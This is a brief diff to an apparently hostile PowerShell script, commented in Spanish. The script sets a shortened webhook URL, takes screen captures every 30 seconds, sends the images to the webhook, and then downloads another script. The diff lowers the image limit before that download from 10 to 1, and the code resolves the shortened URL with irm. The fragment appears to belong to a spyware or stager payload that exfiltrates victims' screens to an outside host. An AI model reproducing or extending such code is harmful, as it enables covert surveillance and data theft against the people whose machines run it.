@@ -1,7 +1,7 @@
 $hookurl = "https://bit.ly/chu_kbras"
 $seconds = 30 # Intervalo entre capturas
 $a = 0 # Contador de imágenes enviadas al webhook
-$maxImages = 10 # Cantidad máxima de imágenes antes de descargar el otro script
+$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
